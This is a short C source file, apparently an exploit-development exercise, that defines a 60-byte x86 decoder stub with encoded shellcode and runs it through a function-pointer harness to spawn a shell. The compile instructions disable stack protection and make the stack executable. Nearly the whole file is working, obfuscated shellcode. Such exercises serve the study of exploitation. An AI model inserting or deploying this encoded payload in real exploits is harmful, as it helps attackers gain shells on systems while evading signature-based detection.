/**
* Filename: shellcode.c
* Author: h3ll0clar1c3
* Purpose: Decode the encoded shellcode and spawn a shell on the local host  
* Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o encoder_final  
* Usage: ./encoder_final
* Shellcode size: 60 bytes
* Architecture: x86
**/

#include <stdio.h>
#include <string.h>

unsigned char decoder[] = \
"\xeb\x17\x5e\x31\xc0\x31\xdb\x31\xc9\xb1\x0f\x8a\x06\x86\x46"
"\x01\x88\x06\x83\xc6\x02\xe2\xf4\xeb\x05\xe8\xe4\xff\xff\xff"
"\xc0\x31\x68\x50\x61\x62\x68\x73\x62\x68\x6e\x69\x68\x2f\x2f"
"\x2f\x2f\x2f\xe3\x89\x89\x50\x53\xe2\xe1\x89\x0b\xb0\x80\xcd";

int main()
{
        printf("Shellcode length:  %d\n", strlen(decoder));
        int (*ret)() = (int(*)())decoder;
        ret();
}
